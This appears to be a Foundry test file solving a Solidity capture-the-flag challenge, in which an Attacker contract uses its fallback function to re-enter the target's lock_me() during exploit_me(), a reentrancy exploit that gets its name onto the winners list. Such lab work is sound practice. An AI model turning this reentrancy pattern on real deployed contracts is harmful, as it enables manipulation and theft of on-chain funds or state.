// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/Challenge.sol";

contract Attacker {
    Challenge target;
    bool called = false;
    
    constructor(address challengeAddress) {
        target = Challenge(challengeAddress);
    }
    
    function attack(string memory name) external {
        target.exploit_me(name);
    }
    
    fallback() external {
        if (!called) {
            called = true;
            target.lock_me();
        }
    }
}

contract ChallengeTest is Test {
    Challenge public challenge;
    Attacker public attacker;
    address owner = address(1);
    address user = address(2);

    function setUp() public {
        vm.prank(owner);
        challenge = new Challenge();
        
        vm.prank(user);
        attacker = new Attacker(address(challenge));
    }

    function testExploit() public {
        vm.startPrank(user);
        attacker.attack("Hacker");
        
        string[] memory winners = challenge.getAllwiners();
        assertEq(winners[0], "Hacker");
        vm.stopPrank();
    }
}